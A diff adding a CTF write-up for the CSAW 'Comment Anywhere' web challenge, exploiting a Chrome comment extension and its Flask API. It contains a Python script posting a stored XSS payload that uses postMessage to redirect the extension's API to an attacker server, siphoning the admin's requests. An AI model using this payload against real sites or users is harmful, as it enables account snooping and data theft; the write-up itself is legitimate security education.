@@ -68,3 +68,56 @@ https://gitlab.com/sharkfacts/shark-facts-for-arush15june/-/blob/main/README.md/
 ```
 
 Flag: `flag{Shark Fact #81: 97 Percent of all sharks are completely harmless to humans}`
+
+# Web - Comment Anywhere - 300
+
+>This is a cool new Chrome extension i'm working on which lets you leave a comment anywhere on any page that others using the extension can see. Check it out!
+
+We are given the chrome extension `extension.crx` and the flask server code `app.py`. We installed the extension in a Chromium installation running inside an Ubuntu virtual machine and unpacked the CRX extension to get the extension source code.
+
+The extensions allowed you to comment on a webpage and the comments will be visible to other users of the extension on the same URL and page coordinates. The extension was supposed to open up an input prompt to pass the comment but that never worked for us. 
+
+The server code listed two API routes `/comment` for making new comments and `/comments?url=<url>` for listing comments for a specific URL. As the API was open, we could list and create new comments for any URL. On requesting the comments for the `https://ctf.csaw.io` using `GET /comments?url=https://ctf.csaw.io` we got a few comments with the creator as admin and many XSS payloads from other participants hinting us on how we should proceed. A lot of the payloads were using window.PostMessage to change the configuration of the extension configuring it to change its API server to one controlled by the participants. As the `POST /comment` API didnt perform any HTML escaping we could pass script tags directly via a POST requests. 
+
+The challenge hint told us to try and see what the admin was doing. We hosted our own API server using the the given server file and comment an XSS payload changing the extension API server via `window.PostMessage` giving us the requests made by the admin. 
+
+```python
+from concurrent.futures import ThreadPoolExecutor
+import requests
+import json
+
+URL = "http://comment-anywhere.chal.csaw.io:8000"
+url = "http://ctf.csaw.io/"
+def do_comment(comm):
+  return requests.post(URL+'/comment', json={
+    'url':url,
+    'coords': {'x':42,'y':123},
+    'creator': "shell",
+    'comment': comm,
+  })
+
+
+def do():
+  r = do_comment("""<img src=x onerror=\";window.postMessage({type: 'commentAnywhereSetCoords', coords: {type: 'setConfig', key: 'api', value: 'http://<SERVER_IP>:8001'}});\">""")
+  print(r, r.text)
+  rL = requests.get(URL+'/comments?url=https://ctf.csaw.io/')
+  try:
+    print(rL.text)
+    if '<SERVER_IP>' in rL.text:
+      print('GOT', len(rL.json()))
+  except:
+    pass
+
+if __name__ == "__main__":
+  while True:
+    futures = []
+    with ThreadPoolExecutor(max_workers=8) as executor:
+      futures.append(executor.submit(do))
+```
+Once the payload was executed by the admin browser, we started receiving requests from the admin listing comments from many URLs, the flag was part of the URLs being listed by the admin.
+
+```
+GET /comments?url=https%3A%2F%2Fctf.csaw.io%2Fcomment-anywhere%2Fflag%257Bh0w_many_l%40yers_of_yavaScr1pt_r_u_0n%3F%7D
+```
+
+Flag: `flag{h0w_many_l@yers_of_yavaScr1pt_r_u_0n?}` 
